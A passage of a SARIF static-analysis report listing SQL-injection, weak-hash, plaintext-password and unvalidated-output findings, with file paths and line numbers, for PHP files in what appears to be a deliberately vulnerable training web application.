            "endLine" : 53,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:53 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 53
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:53 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 53
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4586",
      "message" : {
        "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "8D51CDA178D466B831F9A91F8DC174E3"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/captcha/source/low.php"
          },
          "region" : {
            "startLine" : 57,
            "endLine" : 57,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:57 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 57
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:57 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 57
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4416",
      "message" : {
        "text" : "On line 61 of low.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "20A44396C382E50E5114D6B3D543C8CD"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/captcha/source/low.php"
          },
          "region" : {
            "startLine" : 61,
            "endLine" : 61,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:61 - mysqli_query()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 61
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:61 - mysqli_query()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 61
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4370",
      "message" : {
        "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "053567477E271AC0EE79F38C0F3F7902"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/captcha/source/low.php"
          },
          "region" : {
            "startLine" : 67,
            "endLine" : 67,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:67 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 67
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:67 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 67
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4437",
      "message" : {
        "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "2F633F9D7B86C2F654A7C1D8E65C7E31"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/captcha/source/medium.php"
          },
          "region" : {
            "startLine" : 25,
            "endLine" : 25,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:25 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 25
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:25 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 25
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4542",
      "message" : {
        "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "6FAA2FFA81BDA015B6E2C38368029112"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/captcha/source/medium.php"
          },
          "region" : {
            "startLine" : 39,
            "endLine" : 39,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:39 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 39
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:39 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 39
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4443",
      "message" : {
        "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "32B89CC5F17F9C90713FCD07FE3AA362"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/captcha/source/medium.php"
          },
          "region" : {
            "startLine" : 61,
            "endLine" : 61,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:61 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 61
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:61 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 61
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4627",
      "message" : {
        "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "AB7E3BA42F77F50C64C20E71BE0641E3"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/captcha/source/medium.php"
          },
          "region" : {
            "startLine" : 65,
            "endLine" : 65,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:65 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:65 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4696",
      "message" : {
        "text" : "On line 69 of medium.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "DC44B7114467267082258B17E27CBEFD"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/captcha/source/medium.php"
          },
          "region" : {
            "startLine" : 69,
            "endLine" : 69,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:69 - mysqli_query()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 69
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:69 - mysqli_query()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 69
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4371",
      "message" : {
        "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "053567477E271AC0EE79F38C0F3F7903"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/captcha/source/medium.php"
          },
          "region" : {
            "startLine" : 75,
            "endLine" : 75,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:75 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 75
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:75 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 75
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4484",
      "message" : {
        "text" : "Line 12 of jsonp.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "544E5FD2A483096242AA314F13E8653F"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/csp/source/jsonp.php"
          },
          "region" : {
            "startLine" : 12,
            "endLine" : 12,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "jsonp.php:5 - Read $_GET['callback']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/jsonp.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "jsonp.php:12 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/jsonp.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "jsonp.php:5 - Read $_GET['callback']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/jsonp.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "jsonp.php:5 - Assignment to $callback"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/jsonp.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "jsonp.php:12 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/jsonp.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4684",
      "message" : {
        "text" : "The method writes unvalidated input into JSON. This call could allow an attacker to inject arbitrary elements or attributes into the JSON entity.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "D3B9D985A4C809839A8E3A346107CC17"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/csrf/source/high.php"
          },
          "region" : {
            "startLine" : 8,
            "endLine" : 8,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:8 - file_get_contents(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:8 - json_decode(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:8 - file_get_contents(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:8 - json_decode(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4561",
      "message" : {
        "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "7B9DF4C5DE9DFC43704E68B3841E0EB4"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/csrf/source/high.php"
          },
          "region" : {
            "startLine" : 35,
            "endLine" : 35,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:35 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/high.php"
                },
                "region" : {
                  "startLine" : 35
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:35 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/high.php"
                },
                "region" : {
                  "startLine" : 35
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4553",
      "message" : {
        "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "77CDFDBE186E445EC7453DA04F1A99F3"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/csrf/source/high.php"
          },
          "region" : {
            "startLine" : 39,
            "endLine" : 39,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:39 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/high.php"
                },
                "region" : {
                  "startLine" : 39
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:39 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/high.php"
                },
                "region" : {
                  "startLine" : 39
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4394",
      "message" : {
        "text" : "On line 43 of high.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "163D2797BD42D212411D79A4FCA55A80"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/csrf/source/high.php"
          },
          "region" : {
            "startLine" : 43,
            "endLine" : 43,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:43 - mysqli_query()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/high.php"
                },
                "region" : {
                  "startLine" : 43
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:43 - mysqli_query()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/high.php"
                },
                "region" : {
                  "startLine" : 43
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4530",
      "message" : {
        "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "6C1FA89E483C2A8A8D43C9A70766F341"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/csrf/source/high.php"
          },
          "region" : {
            "startLine" : 49,
            "endLine" : 49,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:49 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/high.php"
                },
                "region" : {
                  "startLine" : 49
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:49 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/high.php"
                },
                "region" : {
                  "startLine" : 49
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4540",
      "message" : {
        "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "6F27D86555DCCB23E56C131FA9C67501"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/csrf/source/impossible.php"
          },
          "region" : {
            "startLine" : 12,
            "endLine" : 12,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:12 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/impossible.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:12 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/impossible.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4750",
      "message" : {
        "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "F70162205216AACD5AA59552038E4472"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/csrf/source/impossible.php"
          },
          "region" : {
            "startLine" : 15,
            "endLine" : 15,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:15 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/impossible.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:15 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/impossible.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4574",
      "message" : {
        "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "88C44EA3A2B1A0FB3B9C38427D925B54"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/csrf/source/impossible.php"
          },
          "region" : {
            "startLine" : 17,
            "endLine" : 17,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:17 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/impossible.php"
                },
                "region" : {
                  "startLine" : 17
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:17 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/impossible.php"
                },
                "region" : {
                  "startLine" : 17
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4708",
      "message" : {
        "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "E26D7058F2184AAB12C2C189E8343A25"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/csrf/source/impossible.php"
          },
          "region" : {
            "startLine" : 23,
            "endLine" : 23,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:23 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/impossible.php"
                },
                "region" : {
                  "startLine" : 23
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:23 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/impossible.php"
                },
                "region" : {
                  "startLine" : 23
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4583",
      "message" : {
        "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "8C4672FE990162B3A9E9A3B98C6FA6A9"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/csrf/source/impossible.php"
          },
          "region" : {
            "startLine" : 28,
            "endLine" : 28,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:28 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/impossible.php"
                },
                "region" : {
                  "startLine" : 28
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:28 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/impossible.php"
                },
                "region" : {
                  "startLine" : 28
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4774",
      "message" : {
        "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "FF4E80F9F5E69445DCA27033C6EBAE0C"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/csrf/source/impossible.php"
          },
          "region" : {
            "startLine" : 30,
            "endLine" : 30,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:30 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/impossible.php"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:30 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/impossible.php"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4531",
      "message" : {
        "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "6C1FA89E483C2A8A8D43C9A70766F342"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/csrf/source/impossible.php"
          },
          "region" : {
            "startLine" : 40,
            "endLine" : 40,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:40 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/impossible.php"
                },
                "region" : {
                  "startLine" : 40
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:40 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/impossible.php"
                },
                "region" : {
                  "startLine" : 40
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4562",
      "message" : {
        "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "7B9DF4C5DE9DFC43704E68B3841E0EB5"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/csrf/source/low.php"
          },
          "region" : {
            "startLine" : 8,
            "endLine" : 8,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:8 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/low.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:8 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/low.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4585",
      "message" : {
        "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "8D51CDA178D466B831F9A91F8DC174E2"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/csrf/source/low.php"
          },
          "region" : {
            "startLine" : 12,
            "endLine" : 12,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:12 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/low.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:12 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/low.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4415",
      "message" : {
        "text" : "On line 16 of low.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "20A44396C382E50E5114D6B3D543C8CC"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/csrf/source/low.php"
          },
          "region" : {
            "startLine" : 16,
            "endLine" : 16,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:16 - mysqli_query()"
              },
